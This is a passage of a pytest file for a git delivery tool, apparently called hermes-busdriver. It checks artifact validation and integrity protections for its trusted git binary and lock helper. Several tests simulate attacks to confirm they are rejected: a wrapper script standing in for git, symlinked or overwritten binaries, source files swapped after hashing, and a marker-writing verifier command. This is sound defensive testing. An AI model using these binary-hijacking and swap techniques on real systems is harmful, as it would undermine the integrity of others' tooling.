        "mutating_run": {"status": "committed_release_failed", "reason": "finalization_lock_release_failed", "side_effects": [{"name": "git_commit", "ok": True}]},
        "steps": [{"name": "git_commit", "status": "completed", "reason": "committed"}],
    }
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args: (delivery_status, 0))
    monkeypatch.setitem(globals_, "execute_mutating_operation", lambda _args, _status: (mutation_result, 0))
    error = artifact_write_error(ns, error_kind)
    monkeypatch.setitem(globals_, "write_artifact", lambda _result: (_ for _ in ()).throw(error))
    monkeypatch.setattr(sys, "argv", [str(DELIVER), "--repo", str(repo), "--plugin-root", str(fake_busdriver(tmp_path / "busdriver")), "--mode", "execute", "--operation", "commit", "--commit-message", "msg"])

    rc = ns["main"]()
    data = json.loads(capsys.readouterr().out)

    assert rc == 1
    assert data["ok"] is False
    assert data["decision"]["status"] == data["run"]["status"] == data["mutating_run"]["status"] == "committed_release_failed"
    assert data["decision"]["reason"] == data["run"]["reason"] == data["steps"][0]["reason"] == "artifact_write_failed_after_side_effect"
    assert data["run"]["artifact_write_error"] == str(error)
    assert data["run"]["artifacts"] == []
    assert data["mutating_run"]["artifact_write_error"] == str(error)
    # Printed, never written: the fallback bytes must not pass as a durable artifact.
    assert ns["artifact_is_valid"](data, data["run"]["run_id"]) is False


@pytest.mark.parametrize("error_kind", ARTIFACT_WRITE_ERROR_KINDS)
def test_ordinary_artifact_write_failure_clears_blocked_mutating_run(error_kind, monkeypatch, capsys, tmp_path: Path):
    # M-1 producer: a blocked mutation with no completed side effect falls back to the ORDINARY
    # artifact-write failure, which is a non-mutating outcome. main() must drop the now-stale
    # nested run so the bytes it produces still satisfy artifact_is_valid.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    repo = init_repo(tmp_path / "repo")
    globals_ = ns["main"].__globals__
    false_flags = {key: False for key in BLOCKED_KEYS}
    delivery_status = {
        "schema": "hermes-busdriver-delivery-status/v0", "read_only": True, "ok": True,
        "repo": {"root": str(repo)}, "markers": {"blocking": []},
        "decision": {"status": "draft_changes_need_busdriver_finalization", "blockers": [], **false_flags},
    }
    args_ns = argparse.Namespace(run_id="ordinary-write-failure", pr=None)
    authority = ns["mutating_authority"]("commit", False, "git_commit_failed", ["test"])
    mutating_run = ns["mutating_run_envelope"](
        args_ns, "commit", "blocked", "git_commit_failed", repo, authority,
        [], {"acquired": True}, {"released": True},
    )
    mutation_result = {
        "ok": False,
        "decision": {"status": "blocked", "reason": "git_commit_failed", **false_flags},
        "mutating_run": mutating_run,
        "steps": [{"name": "git_commit", "status": "blocked", "reason": "git_commit_failed"}],
    }
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args: (delivery_status, 0))
    monkeypatch.setitem(globals_, "execute_mutating_operation", lambda _args, _status: (mutation_result, 2))
    error = artifact_write_error(ns, error_kind)
    monkeypatch.setitem(globals_, "write_artifact", lambda _result: (_ for _ in ()).throw(error))
    monkeypatch.setattr(sys, "argv", [
        str(PRODUCTION_DELIVER), "--repo", str(repo),
        "--plugin-root", str(fake_busdriver(tmp_path / "busdriver")),
        "--mode", "execute", "--operation", "commit", "--commit-message", "msg",
    ])

    rc = ns["main"]()
    data = json.loads(capsys.readouterr().out)

    assert rc == 1
    assert data["ok"] is False
    assert data["decision"]["status"] == data["run"]["status"] == "blocked"
    assert data["decision"]["reason"] == data["run"]["reason"] == "artifact_write_failed"
    assert data["steps"][0] == {"name": "write_artifact", "status": "blocked", "reason": "artifact_write_failed"}
    assert data["run"]["artifacts"] == []
    assert data["mutating_run"] is None
    # The stdout fallback is printed, never written: main() attempts write_artifact once and does
    # not retry, so these bytes are not durable state and the validator must reject them.
    assert ns["artifact_is_valid"](data, data["run"]["run_id"]) is False


def test_delivery_executes_materialized_lock_bytes_after_source_replacement(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    source = tmp_path / "lock-source"
    trusted_bytes = b"#!/usr/bin/env python3\n# trusted\n"
    source.write_bytes(trusted_bytes)
    globals_ = ns["acquire_finalization_lock"].__globals__
    monkeypatch.setitem(globals_, "LOCK_SOURCE", source)
    monkeypatch.setitem(globals_, "TRUSTED_LOCK_SHA256", hashlib.sha256(trusted_bytes).hexdigest())
    calls = []

    def fake_run_lock_helper(cmd, timeout=30):
        calls.append(cmd)
        assert Path(cmd[2]).read_bytes() == trusted_bytes
        source.write_text("raise SystemExit('mutable source executed')\n")
        payload = {"acquired": True, "token": "token", "path": str(tmp_path / "canonical.lock")} if cmd[3] == "acquire" else {"released": True}
        return payload, {"returncode": 0, "ok": True}

    monkeypatch.setitem(globals_, "run_lock_helper", fake_run_lock_helper)
    acquired = ns["acquire_finalization_lock"](tmp_path)
    released = ns["release_finalization_lock"](
        tmp_path, acquired["token"], None, acquired["path"], acquired["trusted_helper_path"]
    )

    assert acquired["acquired"] is True
    assert released["released"] is True
    assert calls[0][2] == calls[1][2]
    assert calls[1][calls[1].index("--lock-path") + 1] == acquired["path"]


def test_delivery_status_executes_authenticated_private_runtime(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    source = tmp_path / "hermes-busdriver-delivery-status"
    trusted_bytes = b"#!/usr/bin/env python3\n# trusted delivery status\n"
    source.write_bytes(trusted_bytes)
    relative = "scripts/hermes-busdriver-delivery-status"
    globals_ = ns["run_delivery_status"].__globals__
    monkeypatch.setitem(globals_, "DELIVERY_STATUS_RUNTIME_SOURCES", {relative: source})
    monkeypatch.setitem(
        globals_,
        "TRUSTED_DELIVERY_STATUS_RUNTIME_DIGESTS",
        {relative: hashlib.sha256(trusted_bytes).hexdigest()},
    )
    trusted_executables = {}
    trusted_digests = {}
    for name in ("git", "gh", "jq"):
        executable = tmp_path / f"trusted-{name}"
        payload = f"trusted {name}\n".encode()
        executable.write_bytes(payload)
        executable.chmod(0o700)
        trusted_executables[name] = executable
        trusted_digests[name] = hashlib.sha256(payload).hexdigest()
    monkeypatch.setitem(globals_, "TRUSTED_EXECUTABLE_DIGESTS", trusted_digests)
    monkeypatch.setitem(globals_, "trusted_executable_path", lambda name: trusted_executables[name])
    calls = []

    def fake_run(cmd, **kwargs):
        calls.append(cmd)
        assert kwargs["env"]["HERMES_BUSDRIVER_PRIVATE_RUNTIME"] == "1"
        private = Path(cmd[2])
        assert private != source
        assert private.read_bytes() == trusted_bytes
        trusted_bin = Path(kwargs["env"]["PATH"].split(os.pathsep)[0])
        for name, executable in trusted_executables.items():
            private_executable = trusted_bin / name
            assert private_executable != executable
            assert private_executable.read_bytes() == executable.read_bytes()
            assert private_executable.stat().st_mode & 0o777 == 0o500
        source.write_text("raise SystemExit('mutable source executed')\n")
        return subprocess.CompletedProcess(cmd, 0, '{"ok": true}\n', "")

    monkeypatch.setattr(globals_["subprocess"], "run", fake_run)
    args = argparse.Namespace(
        repo=None, plugin_root=None, relay_role=None, relay_config=None,
        relay_role_timeout=90, pr=None, pr_grind_timeout=180,
        litmus_status_timeout=60, base=None, drift_baseline=None,
        phase0_status_timeout=60, busdriver_state_dir_name=None,
        pr_grind_result_file=None, delivery_status_timeout=180,
    )

    data, rc = ns["run_delivery_status"](args)

    assert rc == 0
    assert data == {"ok": True}
    assert calls[0][:2] == [sys.executable, "-I"]


def test_delivery_status_private_marker_fails_closed_when_runtime_bin_disappears(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))

    class CP:
        stdout = json.dumps({"ok": False, "error": "private_trusted_bin_unavailable"})
        stderr = ""
        returncode = 2

    def fake_run(cmd, **kwargs):
        runtime_root = Path(cmd[2]).parents[1]
        runtime_bin = runtime_root / "trusted-bin"
        assert kwargs["env"]["HERMES_BUSDRIVER_PRIVATE_RUNTIME"] == "1"
        for child in runtime_bin.iterdir():
            child.unlink()
        runtime_bin.rmdir()
        old_env = os.environ.copy()
        try:
            os.environ.clear()
            os.environ.update(kwargs["env"])
            checker = runpy.run_path(str(runtime_root / "scripts" / "hermes-busdriver-pr-grind-check"))
            with pytest.raises(SystemExit) as exc:
                checker["trusted_executable_path"]("git")
            assert json.loads(str(exc.value))["error"] == "private_trusted_bin_unavailable"
        finally:
            os.environ.clear()
            os.environ.update(old_env)
        return CP()

    monkeypatch.setattr(ns["subprocess"], "run", fake_run)
    args = argparse.Namespace(
        repo=None,
        plugin_root=None,
        pr=None,
        pr_grind_result_file=None,
        delivery_status_timeout=180,
        litmus_base_ref=None,
        relay_role=None,
        relay_config=None,
        relay_role_timeout=90,
        relay_role_network_budget=1,
        drift_baseline=None,
        busdriver_state_dir_name=None,
    )

    data, rc = ns["run_delivery_status"](args)

    assert rc == 2
    assert data["error"] == "private_trusted_bin_unavailable"


@pytest.mark.parametrize(
    "mutation",
    ("bin_missing", "entry_missing", "bin_symlink", "entry_symlink", "mode_tamper", "digest_tamper"),
)
def test_real_delivery_status_child_rejects_private_runtime_mutation_before_git(
    monkeypatch, tmp_path: Path, mutation: str
):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    repo = init_repo(tmp_path / "repo")
    real_run = subprocess.run
    sentinel = tmp_path / "sentinel"
    fallback = tmp_path / "fallback"
    fallback.mkdir()

    def wrapper(path: Path) -> None:
        path.write_text(
            "#!/bin/sh\n"
            f"printf ran >> {shlex.quote(str(sentinel))}\n"
            "exec /usr/bin/git \"$@\"\n"
        )
        path.chmod(0o500)

    def mutate_then_run(cmd, **kwargs):
        runtime_root = Path(cmd[2]).parents[1]
        trusted_bin = runtime_root / "trusted-bin"
        if mutation == "bin_missing":
            shutil.rmtree(trusted_bin)
        elif mutation == "entry_missing":
            (trusted_bin / "git").unlink()
        elif mutation == "bin_symlink":
            shutil.rmtree(trusted_bin)
            wrapper(fallback / "git")
            os.symlink(fallback, trusted_bin)
        elif mutation == "entry_symlink":
            (trusted_bin / "git").unlink()
            wrapper(fallback / "git")
            os.symlink(fallback / "git", trusted_bin / "git")
        elif mutation == "mode_tamper":
            (trusted_bin / "git").chmod(0o700)
        elif mutation == "digest_tamper":
            target = trusted_bin / "git"
            target.chmod(0o700)
            wrapper(target)
        return real_run(cmd, **kwargs)

    monkeypatch.setattr(ns["run_delivery_status"].__globals__["subprocess"], "run", mutate_then_run)
    args = argparse.Namespace(
        repo=str(repo), plugin_root=str(tmp_path / "missing-plugin"), pr=None,
        pr_grind_result_file=None, delivery_status_timeout=60,
        litmus_base_ref=None, relay_role=None, relay_config=None,
        relay_role_timeout=10, relay_role_network_budget=1,
        drift_baseline=None, busdriver_state_dir_name=None,
    )
    data, rc = ns["run_delivery_status"](args, include_lock_status=False)
    assert rc != 0
    assert str(data.get("error", "")).startswith("private_trusted_")
    assert not sentinel.exists()


def test_dispatch_trusted_executable_is_private_immutable_copy(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    globals_ = ns["trusted_executable_path"].__globals__
    source = tmp_path / "mutable-git"
    payload = b"trusted executable bytes\n"
    source.write_bytes(payload)
    source.chmod(0o700)
    monkeypatch.setitem(globals_, "TRUSTED_GIT", source)
    monkeypatch.setitem(globals_["TRUSTED_EXECUTABLE_DIGESTS"], "git", hashlib.sha256(payload).hexdigest())

    private = ns["trusted_executable_path"]("git")

    assert private != source
    assert private.read_bytes() == payload
    assert private.stat().st_mode & 0o777 == 0o500
    assert private.parent.stat().st_mode & 0o777 == 0o700
    source.write_bytes(b"source changed after authentication\n")
    assert ns["trusted_executable_path"]("git") == private
    assert private.read_bytes() == payload


def test_direct_commit_preflight_git_edges_use_private_authenticated_path(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    repo = tmp_path / "repo"
    git_dir = repo / ".git"
    (git_dir / "hooks").mkdir(parents=True)
    private = tmp_path / "private-runtime" / "git"
    private.parent.mkdir()
    private.write_text("trusted git\n")
    calls = []

    class FakeCompleted:
        def __init__(self, returncode=0, stdout=None, stderr=""):
            self.returncode = returncode
            self.stdout = "" if stdout is None else stdout
            self.stderr = stderr

    def fake_run(cmd, **kwargs):
        calls.append(cmd)
        if "--get-regexp" in cmd:
            return FakeCompleted(returncode=1)
        if "--git-common-dir" in cmd:
            return FakeCompleted(stdout=str(git_dir) + "\n")
        if "remote.origin.url" in cmd:
            return FakeCompleted(stdout="https://github.com/owner/repo.git\n")
        return FakeCompleted(stdout=b"" if kwargs.get("capture_output") else "")

    globals_ = ns["git_mutation_config_safety"].__globals__
    monkeypatch.setitem(globals_, "trusted_executable_path", lambda _name: private)
    monkeypatch.setattr(globals_["subprocess"], "run", fake_run)

    assert ns["git_mutation_config_safety"](repo) == (True, None)
    assert ns["github_remote_url"](repo) == "https://github.com/owner/repo.git"
    assert ns["staged_marker_entries"](repo, {".claude"}) == []
    assert calls
    assert all(Path(cmd[0]) == private for cmd in calls)


def test_malformed_verifier_command_preserves_user_label(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    cp, data = invoke(
        repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "verify",
        "--verifier",
        "quoted=python -c 'unterminated",
        artifact_dir=artifact_dir,
    )

    verifier = data["verifiers"][0]
    assert cp.returncode == 1
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "verifier_failed"
    assert verifier["name"] == "quoted"
    assert verifier["returncode"] == 2
    assert verifier["ok"] is False
    assert "No closing quotation" in verifier["stderr_tail"]
    assert Path(data["run_artifact_path"]).exists()
    assert_finalization_blocked(data["decision"])


def test_unsupported_execute_operation_fails_closed_without_verifier(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    marker = tmp_path / "verifier-ran"

    cp, data = invoke(
        repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "plan",
        "--verifier",
        f"trip=printf ran > {shlex.quote(str(marker))}",
    )

    assert cp.returncode == 2
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "unsupported_operation"
    assert data["verifiers"] == []
    assert data["run_artifact_path"] is None
    assert not marker.exists()
    assert_finalization_blocked(data["decision"])


def test_git_output_disables_fsmonitor_and_global_git_config(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo")
    captured = {}

    class FakeCompleted:
        returncode = 0
        stdout = " M .claude/litmus-passed.local\n"
        stderr = " warning with leading space\n"

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        captured["env"] = kwargs.get("env")
        return FakeCompleted()

    monkeypatch.setattr(ns["git_output"].__globals__["subprocess"], "run", fake_run)

    rc, out, err = ns["git_output"](repo, "status", "--porcelain=v1", "--untracked-files=all")

    assert rc == 0
    assert out == " M .claude/litmus-passed.local"
    assert err == " warning with leading space"
    assert Path(captured["cmd"][0]).name == "git"
    assert captured["cmd"][1:5] == ["-C", str(repo), "-c", "core.fsmonitor=false"]
    assert captured["env"]["GIT_CONFIG_GLOBAL"] == os.devnull
    assert captured["env"]["GIT_CONFIG_NOSYSTEM"] == "1"


def test_staged_diff_hash_uses_full_diff_bytes(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo")
    (repo / "tracked.txt").write_text("changed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    diff = run(["git", "diff", "--cached", "--no-ext-diff", "--no-textconv", "--no-color"], repo).stdout
    assert ns["staged_diff_hash"](repo) == __import__("hashlib").sha256(diff.encode()).hexdigest()


def test_all_commit_diff_evidence_executes_private_authenticated_git(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    private_root = tmp_path / "private"
    private_root.mkdir(mode=0o700)
    private_git = private_root / "git"
    private_git.write_bytes(b"authenticated git\n")
    private_git.chmod(0o500)
    seen: list[list[str]] = []

    class CP:
        returncode = 0
        stdout = b"reviewed diff\n"
        stderr = b""

    def fake_trusted(name: str) -> Path:
        assert name == "git"
        return private_git

    def fake_run(cmd, **_kwargs):
        seen.append(cmd)
        return CP()

    globals_ = ns["staged_diff_hash"].__globals__
    monkeypatch.setitem(globals_, "trusted_executable_path", fake_trusted)
    monkeypatch.setattr(globals_["subprocess"], "run", fake_run)
    repo = tmp_path / "repo"
    repo.mkdir()
    assert ns["staged_diff_hash"](repo)
    assert ns["reviewed_tree_diff_hash"](repo, "a" * 40, "b" * 40)
    assert ns["diff_hash"](repo, "HEAD")
    assert len(seen) == 3
    assert all(Path(cmd[0]) == private_git for cmd in seen)


def test_commit_staged_index_rejects_index_changed_after_review_binding(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-commit-binding")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    expected_parent = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
    expected_tree = run(["git", "write-tree"], repo).stdout.strip()

    (repo / "tracked.txt").write_text("unreviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    effect = ns["commit_staged_index"](
        repo,
        "must not commit drift",
        {"BUSDRIVER_STATE_DIR": ".claude"},
        expected_parent_head=expected_parent,
        expected_tree=expected_tree,
    )

    assert effect["ok"] is False
    assert effect["error"] == "commit_index_changed_after_review"
    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == expected_parent


def test_artifact_validator_rejects_authority_positive_mutating_run(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    run_id = "mutating-artifact-1"
    args = argparse.Namespace(run_id=run_id, pr=None)
    authority = ns["mutating_authority"]("commit", True, "committed", ["test"])
    mutating_run = ns["mutating_run_envelope"](
        args,
        "commit",
        "committed",
        "committed",
        tmp_path,
        authority,
        [{"name": "git_commit", "ok": True}],
        {"acquired": True},
        {"released": True},
    )
    false_flags = {key: False for key in BLOCKED_KEYS}
    payload = {
        "schema": "hermes-busdriver-deliver/v0",
        "version": 1,
        "ok": True,
        "mode": "execute",
        "operation": "commit",
        "decision": {"status": "committed", "reason": "committed", **false_flags},
        "run": {
            "schema": "hermes-busdriver-delivery-run/v0",
            "version": 1,
            "run_id": run_id,
            "created_at": "2026-07-10T00:00:00Z",
            "phase": "commit",
            "status": "committed",
            "reason": "committed",
            "repo_root": str(tmp_path),
            "pr_number": None,
            "authority": false_flags,
            "artifacts": [],
        },
        "mutating_run": mutating_run,
    }
    assert ns["artifact_is_valid"](payload, run_id) is True
    payload["mutating_run"]["authority"]["merge_allowed"] = True
    assert ns["artifact_is_valid"](payload, run_id) is False


def test_artifact_validator_rejects_cross_envelope_outcome_and_phase_mismatches(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    run_id = "artifact-correlation-1"
    false_flags = {key: False for key in BLOCKED_KEYS}
    valid = {
        "schema": "hermes-busdriver-deliver/v0",
        "version": 1,
        "ok": True,
        "mode": "execute",
        "operation": "pr-grind",
        "decision": {"status": "pr_grind_clean", "reason": "latest_pr_head_clean_read_only", **false_flags},
        "run": {
            "schema": "hermes-busdriver-delivery-run/v0",
            "version": 1,
            "run_id": run_id,
            "created_at": "2026-07-15T00:00:00Z",
            "phase": "pr_grind",
            "status": "pr_grind_clean",
            "reason": "latest_pr_head_clean_read_only",
            "repo_root": str(tmp_path),
            "pr_number": None,
            "authority": false_flags,
            "artifacts": [],
        },
        "mutating_run": None,
    }
    assert ns["artifact_is_valid"](valid, run_id) is True

    mutations = {
        "decision_status": lambda data: data["decision"].update(status="blocked"),
        "decision_reason": lambda data: data["decision"].update(reason="pr_grind_wait"),
        "run_status": lambda data: data["run"].update(status="blocked"),
        "run_reason": lambda data: data["run"].update(reason="pr_grind_wait"),
        "ok": lambda data: data.update(ok=False),
        "mode": lambda data: data.update(mode="status"),
        "operation": lambda data: data.update(operation="commit"),
        "phase": lambda data: data["run"].update(phase="commit"),
    }
    for label, mutate in mutations.items():
        candidate = json.loads(json.dumps(valid))
        mutate(candidate)
        assert ns["artifact_is_valid"](candidate, run_id) is False, label


def artifact_contract_payload(
    ns: dict,
    tmp_path: Path,
    operation: str,
    ok: bool,
    status: str,
    reason: str,
    *,
    phase: str | None = None,
    mutating_reason: str | None = None,
    mutating_authority_allowed: bool = False,
) -> tuple[str, dict]:
    run_id = f"artifact-contract-{operation}"
    false_flags = {key: False for key in BLOCKED_KEYS}
    mutating_run = None
    if operation in {"pre-pr-review", "commit", "push", "pr-create", "merge"}:
        inner_reason = mutating_reason or reason
        args = argparse.Namespace(run_id=run_id, pr=None)
        authority = ns["mutating_authority"](operation, mutating_authority_allowed, inner_reason, ["test"])
        mutating_run = ns["mutating_run_envelope"](
            args,
            operation,
            status,
            inner_reason,
            tmp_path,
            authority,
            [],
            {"acquired": True},
            {"released": True},
        )
    payload = {
        "schema": "hermes-busdriver-deliver/v0",
        "version": 1,
        "ok": ok,
        "mode": "execute",
        "operation": operation,
        "decision": {"status": status, "reason": reason, **false_flags},
        "run": {
            "schema": "hermes-busdriver-delivery-run/v0",
            "version": 1,
            "run_id": run_id,
            "created_at": "2026-07-15T00:00:00Z",
            "phase": phase or operation.replace("-", "_"),
            "status": status,
            "reason": reason,
            "repo_root": str(tmp_path),
            "pr_number": None,
            "authority": false_flags,
            "artifacts": [],
        },
        "mutating_run": mutating_run,
    }
    return run_id, payload


@pytest.mark.parametrize(
    ("operation", "ok", "status", "reason", "phase"),
    [
        ("pr-grind", True, "pr_grind_clean", "latest_pr_head_clean_read_only", "pr_grind"),
        ("pr-grind", False, "blocked", "pr_grind_needs_fix", "pr_grind"),
        ("pr-grind", False, "blocked", "pr_grind_wait", "pr_grind"),
        ("pr-grind", False, "blocked", "pr_grind_blocked", "pr_grind"),
        ("pr-grind", False, "blocked", "pr_grind_loop_failed", "pr_grind"),
        ("pr-grind", False, "blocked", "delivery_status_failed", "delivery_status"),
        ("commit", True, "committed", "committed", "commit"),
        ("commit", False, "blocked", "git_commit_failed", "commit"),
        ("commit", False, "committed", "post_commit_concurrent_work_preserved", "commit"),
        ("commit", False, "committed", "post_commit_external_dirty_drift", "commit"),
        ("commit", False, "committed", "post_commit_untracked_dirty", "commit"),
        ("commit", False, "committed", "post_commit_non_marker_dirty_remaining", "commit"),
        ("commit", False, "committed", "post_commit_status_failed", "commit"),
        ("commit", False, "committed", "post_commit_dirty_check_failed", "commit"),
        ("commit", False, "committed", "post_commit_dirty_restore_failed", "commit"),
        ("commit", False, "committed", "post_commit_reviewed_untracked_clean_failed", "commit"),
        ("commit", False, "blocked", "delivery_status_failed", "delivery_status"),
    ],
)
def test_artifact_validator_accepts_production_outcomes(
    tmp_path: Path,
    operation: str,
    ok: bool,
    status: str,
    reason: str,
    phase: str,
):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id, payload = artifact_contract_payload(
        ns,
        tmp_path,
        operation,
        ok,
        status,
        reason,
        phase=phase,
        # Only genuine normal-success outcomes carry an allowed=True mutating authority in
        # production; every other outcome (including the ok=True already_up_to_date no-op) is
        # authority allowed=False.
        mutating_authority_allowed=(operation, status, reason) in _AUTHORITY_ALLOWED_SUCCESS,
    )
    if reason == "delivery_status_failed":
        payload["mutating_run"] = None
    assert ns["artifact_is_valid"](payload, run_id) is True


@pytest.mark.parametrize(
    ("operation", "status"),
    [
        ("commit", "committed_release_failed"),
    ],
)
def test_artifact_validator_accepts_finalization_lock_release_failures(tmp_path: Path, operation: str, status: str):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id, payload = artifact_contract_payload(
        ns,
        tmp_path,
        operation,
        False,
        status,
        "finalization_lock_release_failed",
    )
    assert ns["artifact_is_valid"](payload, run_id) is True


@pytest.mark.parametrize(
    ("operation", "ok", "status", "reason"),
    [
        ("commit", False, "committed", "committed"),
        ("verify", True, "made_up_success", "made_up_success"),
        ("commit", False, "blocked", "made_up_failure"),
    ],
)
def test_artifact_validator_rejects_unknown_or_inconsistent_outcomes(
    tmp_path: Path,
    operation: str,
    ok: bool,
    status: str,
    reason: str,
):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id, payload = artifact_contract_payload(ns, tmp_path, operation, ok, status, reason)
    assert ns["artifact_is_valid"](payload, run_id) is False


# Authority-allowed mutating outcomes: the ONLY (operation, status, reason) tuples whose nested
# mutating authority carries allowed=True in a reachable production artifact. Every other
# mutating outcome (blockers, reconciliation, release-failed) is authority allowed=False.
# Derived from scripts/hermes-busdriver-deliver mutating_authority() call sites that are not
# behind a FIXED_EARLY_BLOCKED_OPERATIONS blocker.
_AUTHORITY_ALLOWED_SUCCESS = {
    ("commit", "committed", "committed"),
}


def _mutating_artifact_payload(
    ns: dict,
    tmp_path: Path,
    *,
    run_id: str,
    operation: str,
    phase: str,
    ok: bool,
    outer_status: str,
    outer_reason: str,
    mut_status: str,
    mut_reason: str,
    authority_allowed: bool,
    authority_reason: str,
    side_effects: list | None = None,
) -> dict:
    false_flags = {key: False for key in BLOCKED_KEYS}
    args = argparse.Namespace(run_id=run_id, pr=None)
    authority = ns["mutating_authority"](operation, authority_allowed, authority_reason, ["test"])
    mutating_run = ns["mutating_run_envelope"](
        args,
        operation,
        mut_status,
        mut_reason,
        tmp_path,
        authority,
        side_effects or [],
        {"acquired": True},
        {"released": True},
    )
    return {
        "schema": "hermes-busdriver-deliver/v0",
        "version": 1,
        "ok": ok,
        "mode": "execute",
        "operation": operation,
        "decision": {"status": outer_status, "reason": outer_reason, **false_flags},
        "run": {
            "schema": "hermes-busdriver-delivery-run/v0",
            "version": 1,
            "run_id": run_id,
            "created_at": "2026-07-15T00:00:00Z",
            "phase": phase,
            "status": outer_status,
            "reason": outer_reason,
            "repo_root": str(tmp_path),
            "pr_number": None,
            "authority": false_flags,
            "artifacts": [],
        },
        "mutating_run": mutating_run,
    }


def _signed_lookup_rejects(ns: dict, monkeypatch, tmp_path: Path, run_id: str, payload: dict) -> None:
    """Persist ``payload`` with the real process-scoped writer key and assert the authenticated
    same-process lookup (direct and status mode) still fails closed."""
    artifact_dir = tmp_path / "delivery-runs"
    artifact_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
    monkeypatch.setenv(ARTIFACT_ENV, str(artifact_dir))
    ns["write_artifact"](payload)
    assert ns["artifact_for_run_id"](run_id) is None
    status_args = argparse.Namespace(mode="status", operation="status", run_id=run_id, pr=None, pretty=False)
    result, rc = ns["status_mode_result"](status_args)
    assert result["status_lookup"]["found"] is False
    assert rc != 0


def _signed_lookup_accepts(ns: dict, monkeypatch, tmp_path: Path, run_id: str, payload: dict) -> None:
    artifact_dir = tmp_path / "delivery-runs"
    artifact_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
    monkeypatch.setenv(ARTIFACT_ENV, str(artifact_dir))
    ns["write_artifact"](payload)
    found = ns["artifact_for_run_id"](run_id)
    assert found is not None


def test_artifact_validator_rejects_commit_success_missing_mutating_run(monkeypatch, tmp_path: Path):
    # M-1: an authenticated commit success MUST carry its complete mutating run.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id, payload = artifact_contract_payload(
        ns, tmp_path, "commit", True, "committed", "committed", mutating_authority_allowed=True
    )
    # Positive control: the exact envelope with its mutating run is accepted.
    assert ns["artifact_is_valid"](payload, run_id) is True
    payload["mutating_run"] = None
    assert ns["artifact_is_valid"](payload, run_id) is False
    _signed_lookup_rejects(ns, monkeypatch, tmp_path, run_id, payload)


def test_artifact_validator_rejects_blocked_commit_missing_mutating_run(tmp_path: Path):
    # M-1: a blocked commit is still a mutating-phase outcome and MUST carry its mutating run.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id, payload = artifact_contract_payload(ns, tmp_path, "commit", False, "blocked", "git_commit_failed")
    assert ns["artifact_is_valid"](payload, run_id) is True
    payload["mutating_run"] = None
    assert ns["artifact_is_valid"](payload, run_id) is False


def test_artifact_validator_rejects_delivery_status_outcome_with_unexpected_mutating_run(monkeypatch, tmp_path: Path):
    # M-1: a delivery_status blocker for a mutating operation never runs a mutation, so any
    # attached mutating run is fabricated durable state.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id = "artifact-ds-unexpected"
    false_flags = {key: False for key in BLOCKED_KEYS}
    payload = {
        "schema": "hermes-busdriver-deliver/v0",
        "version": 1,
        "ok": False,
        "mode": "execute",
        "operation": "commit",
        "decision": {"status": "blocked", "reason": "delivery_status_failed", **false_flags},
        "run": {
            "schema": "hermes-busdriver-delivery-run/v0",
            "version": 1,
            "run_id": run_id,
            "created_at": "2026-07-15T00:00:00Z",
            "phase": "delivery_status",
            "status": "blocked",
            "reason": "delivery_status_failed",
            "repo_root": str(tmp_path),
            "pr_number": None,
            "authority": false_flags,
            "artifacts": [],
        },
        "mutating_run": None,
    }
    # Positive control: the genuine non-mutating delivery_status envelope is accepted.
    assert ns["artifact_is_valid"](payload, run_id) is True
    args = argparse.Namespace(run_id=run_id, pr=None)
    authority = ns["mutating_authority"]("commit", False, "delivery_status_failed", ["test"])
    payload["mutating_run"] = ns["mutating_run_envelope"](
        args, "commit", "blocked", "delivery_status_failed", tmp_path, authority, [], {"acquired": True}, {"released": True}
    )
    assert ns["artifact_is_valid"](payload, run_id) is False
    _signed_lookup_rejects(ns, monkeypatch, tmp_path, run_id, payload)


def test_artifact_validator_rejects_blocked_outcome_with_positive_commit_authority(tmp_path: Path):
    # M-2: a blocked outcome may not carry a positive (allowed) mutating authority.
